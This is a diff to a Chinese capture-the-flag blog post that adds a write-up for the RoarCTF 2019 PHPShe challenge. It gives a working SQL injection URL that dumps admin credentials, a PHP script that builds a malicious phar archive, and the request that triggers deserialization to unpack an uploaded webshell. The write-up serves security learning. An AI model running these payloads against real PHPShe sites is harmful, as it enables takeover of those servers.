@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    3.4k 字
+                    4.1k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    59
+                    71
                      分钟
                   </span>
                 
@@ -665,6 +665,104 @@ while True:
 <p>Flag:</p>
 <pre><code class="hljs undefined">flag&#123;ed8af206-7c81-4981-9746-2c9c70adb07f&#125;</code></pre>
 
+<h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><p>考点:</p>
+<p>代码审计—-sql注入—phar反序列化</p>
+<p>参考wp:<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/phpshe" target="_blank" rel="noopener">https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Web/phpshe</a></p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入:"></a>注入:</h3><pre><code class="hljs undefined">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/18/YfkD8x.png" srcset="/img/loading.gif" alt="YfkD8x.png"></p>
+<p>解密密码为altman777,登陆后台</p>
+<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>简单分析一下：</p>
+<p>这里刻意加了一个解压的析构函数</p>
+<pre><code class="hljs undefined">public function __destruct()
+  &#123;
+  $this-&gt;extract(PCLZIP_OPT_PATH, $this-&gt;save_path);
+  &#125;</code></pre>
+
+<p>然后利用is_file触发phar反序列化</p>
+<p>通过moban.php的del功能传入<strong>tpl</strong>参数，通过<strong>is_file</strong>函数触发<strong>phar反序列化</strong>，对之前上传的包含shell的zip文件进行解压缩得到shell</p>
+<hr>
+<p>开始搞起：</p>
+<p>首先在后台品牌管理理处将shell.php压缩成zip⽂文件上传</p>
+<p>比如把shell.php压缩成shell.php.zip，然后上传，右键图片获取地址为15.zip</p>
+<p>记住这个15.zip</p>
+<p>exp.php</p>
+<p>按情况修改你要解压的一句话木马路径，此处我上传的路径为15.zip</p>
+<pre><code class="hljs undefined">&lt;?php
+class PclZip
+&#123;
+    // ----- Filename of the zip file
+    var $zipname = &apos;&apos;;
+
+    // ----- File descriptor of the zip file
+    var $zip_fd = 0;
+
+    // ----- Internal error handling
+    var $error_code = 1;
+    var $error_string = &apos;&apos;;
+
+    // ----- Current status of the magic_quotes_runtime
+    // This value store the php configuration for magic_quotes
+    // The class can then disable the magic_quotes and reset it after
+    var $magic_quotes_status;
+    var $save_path;
+
+    // --------------------------------------------------------------------------------
+    // Function : PclZip()
+    // Description :
+    //   Creates a PclZip object and set the name of the associated Zip archive
+    //   filename.
+    //   Note that no real action is taken, if the archive does not exist it is not
+    //   created. Use create() for that.
+    // --------------------------------------------------------------------------------
+    function __construct($p_zipname)
+    &#123;
+        //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, &apos;PclZip::PclZip&apos;, &quot;zipname=$p_zipname&quot;);
+
+        // ----- Tests the zlib
+        
+
+        // ----- Set the attributes
+        $this-&gt;zipname = $p_zipname;
+        $this-&gt;zip_fd = 0;
+        $this-&gt;magic_quotes_status = -1;
+
+        // ----- Return
+        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);
+        return;
+    &#125;
+&#125;
+
+$f=new PclZip(&quot;/var/www/html/data/attachment/brand/15.zip&quot;);
+$f-&gt;save_path=&apos;/var/www/html/data&apos;;
+echo serialize($f);
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测
+$phar-&gt;setMetadata($f); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();
+?&gt;</code></pre>
+
+<p>生成phar.phar，修改为phar.txt，上传，也是右键复制路径，此处phar.txt路径为16.txt</p>
+<p>然后发包:</p>
+<p>token要改，referer要改,token可以在上传抓包时候看到，</p>
+<p><img src="https://s1.ax1x.com/2020/05/18/YfESkd.png" srcset="/img/loading.gif" alt="YfESkd.png"></p>
+<pre><code class="hljs undefined">GET /admin.php?mod=moban&amp;act=del&amp;token=e6c01aa7dba09b8cfa2cf473cb364eef&amp;tpl=phar:///var/www/html/data/attachment/brand/16.txt HTTP/1.1
+Host: b804cbde-d0cc-4922-9a45-6b0af3e44aac.node3.buuoj.cn
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://b804cbde-d0cc-4922-9a45-6b0af3e44aac.node3.buuoj.cn/admin.php?mod=moban
+Cookie: PHPSESSID=11ibbbdbbtme42btass2sitfv5
+Upgrade-Insecure-Requests: 1</code></pre>
+
+<p>然后我们的一句话木马shell.php.zip，在网站的路径为/var/www/html/data/attachment/brand/15.zip就解压到/var/www/html/data/shell.php</p>
+<p>访问木马:</p>
+<p><img src="https://s1.ax1x.com/2020/05/18/Yfkw5R.png" srcset="/img/loading.gif" alt="Yfkw5R.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/18/Yfkda9.png" srcset="/img/loading.gif" alt="Yfkda9.png"></p>
 
             </article>
             <hr>
